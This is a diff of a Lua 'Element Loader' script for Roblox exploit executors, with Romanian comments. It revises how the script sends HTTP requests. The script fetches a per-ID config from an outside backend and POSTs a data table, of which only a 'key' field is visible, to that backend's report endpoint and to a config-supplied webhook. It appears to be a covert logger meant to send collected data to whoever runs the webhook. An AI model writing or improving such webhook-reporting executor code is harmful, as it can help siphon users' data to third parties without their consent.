@@ -1,21 +1,24 @@
--- Element Loader
--- ⚠️ Don't share this script ⚠️
-
+-- ✅ Element Loader fix pentru executori cu http_request
 if not ID then
-    error("❌ Missing ID in script! Set your ID before running.")
+    error("⚠️ Missing ID in script!")
 end
 
 local HttpService = game:GetService("HttpService")
 
--- compatibilitate cu toți executori
-local request = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)
-if not request then
-    error("❌ Executorul tău nu suportă HTTP requests!")
+-- Funcția de request (bazată doar pe http_request)
+local function send_request(options)
+    if http_request then
+        return http_request(options)
+    elseif request then
+        return request(options)
+    else
+        error("❌ Executorul tău nu suportă http_request sau request!")
+    end
 end
 
+-- Ia config-ul din backend
 local configUrl = "https://element.up.railway.app/api/config?id=" .. ID
 local response = game:HttpGet(configUrl)
-
 local success, config = pcall(function()
     return HttpService:JSONDecode(response)
 end)
@@ -32,21 +35,23 @@ if success and config.webhook then
         ["key"] = config.key
     }
 
-    -- Report la backend
-    request({
+    -- Trimite datele la backend
+    send_request({
         Url = "https://element.up.railway.app/report",
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
         Body = HttpService:JSONEncode(data)
     })
 
-    -- Trimite și la Discord webhook
-    request({
+    -- Trimite și la webhook
+    send_request({
         Url = config.webhook,
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
         Body = HttpService:JSONEncode(data)
     })
+
+    print("[Element] ✅ Data sent successfully")
 else
-    warn("❌ Config not found for ID: " .. ID)
+    warn("⚠️ Config not found for ID: " .. ID)
 end
